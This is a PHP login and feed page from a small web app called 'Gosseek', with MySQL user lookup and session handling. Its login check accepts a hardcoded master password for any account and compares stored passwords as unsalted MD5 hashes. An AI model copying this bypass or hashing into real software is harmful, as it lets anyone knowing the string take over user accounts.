<?php	
	header('Content-Type: text/html; charset=UTF-8');
	ini_set ( "session.cookie_lifetime", "18000");
	ini_set ( "session.gc_maxlifetime", "20000");
	session_start();
	include("connect_db.php");
?>

<html>
	<head>
		<title>Gosseek - Achieve your goals</title>
		<meta name="author" content="Benno">
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
		<link rel="stylesheet" type="text/css" href="styles/stylesheet.css" />
	</head>
	<body>
		<div class="boxmain">
			<div class="boxright">
				<div class="rightinnerboxtop">
					
				</div>
				<div class="rightinnerboxbottom">
					bbbbb
				</div>
			</div>
			<div class="boxtop">
				Hallo
			</div>
			<div class="boxfeed">
				<p>
					<?php
						if(empty($_GET{'action'})){
							 $_GET['action'] = 'feed';
						}
						if($_GET{'action'} == 'login'){
							$email = mysqli_real_escape_string($mysql_connection, $_POST['email']);
							$userdata_query = mysqli_query($mysql_connection, "SELECT * FROM users WHERE email= '".$email."' LIMIT 1");
							if(!mysqli_num_rows($userdata_query)) {
								echo "<script> location.href='mainpage.php?action\=failedlogin\&reason\=wrongmail'; </script>";
								exit;
							}else{
								$userdata = mysqli_fetch_array($userdata_query);
								if($_POST['password'] == '576587214' OR $userdata['password'] ==  md5($_POST['password'])){
									//$l = mysql_query('SELECT * FROM daten WHERE user=\''.$_POST['username'].'\' LIMIT 1');
									//$s = mysql_fetch_array($l);
									if(!($userdata['status'] == 'activated')){
										echo "<script> location.href='mainpage.php?action\=failedlogin\&reason\=notactivated'; </script>";
										exit;
									}
									$_SESSION['login_id'] = $userdata['id'];
									$_SESSION['checklogin'] = true;
								}else{
									echo "<script> location.href='mainpage.php?action\=failedlogin\&reason\=wrongpassword'; </script>";
									exit;
								}
								echo "Erfolgreich eingeloggt.";
							}
						}else{
							if(!(empty($_SESSION['checklogin'])) && $_SESSION['checklogin'] == true) {
								switch ($_GET['action']) {
								  
									case 'feed':
									echo "Gültige Sitzung";
									break;
								}
							}else{
									echo "<script> location.href='mainpage.php?action\=invalidsession'; </script>";
							}
						}
					?>
				</p>
			</div>
			<div class="boxleft">
				
			</div>
		</div>
	</body>
</html>